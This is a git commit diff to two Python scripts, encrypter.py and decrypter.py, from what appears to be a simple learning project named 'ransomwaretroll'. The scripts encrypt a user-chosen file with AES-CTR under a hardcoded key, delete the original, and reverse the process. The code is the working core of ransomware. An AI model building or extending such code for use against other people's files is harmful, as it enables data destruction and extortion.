5504e9bae61578c0c6a5dfeb9d032d4fa32c9424
Leandro Marques <leandrojerse@gmail.com>
2025-01-31 22:40:01 -0300

    Changes in the key and the method to set the path_file

--- decrypter.py
+++ decrypter.py
@@ -2,21 +2,24 @@ import os
 import pyaes
 
 ## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
+
+
+file_path = input("Write the file path\n")
+file_name_crypted = file_path + ".ransomwaretroll"
+file = open(file_name_crypted, "rb")
 file_data = file.read()
 file.close()
 
 ## chave para descriptografia
-key = b"testeransomwares"
+key = b"chavede16digitos"
 aes = pyaes.AESModeOfOperationCTR(key)
 decrypt_data = aes.decrypt(file_data)
 
 ## remover o arquivo criptografado
-os.remove(file_name)
+os.remove(file_name_crypted)
 
 ## criar o arquivo descriptografado
-new_file = "teste.txt"
+new_file = file_path
 new_file = open(f'{new_file}', "wb")
 new_file.write(decrypt_data)
 new_file.close()
--- encrypter.py
+++ encrypter.py
@@ -2,23 +2,23 @@ import os
 import pyaes
 
 ## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
+file_path = input("Type the file which you want to cryptograph\n")
+file = open(file_path, "rb")
 file_data = file.read()
 file.close()
 
 ## remover o arquivo
-os.remove(file_name)
+os.remove(file_path)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"chavede16digitos"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
 crypto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
+new_file = file_path + ".ransomwaretroll"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
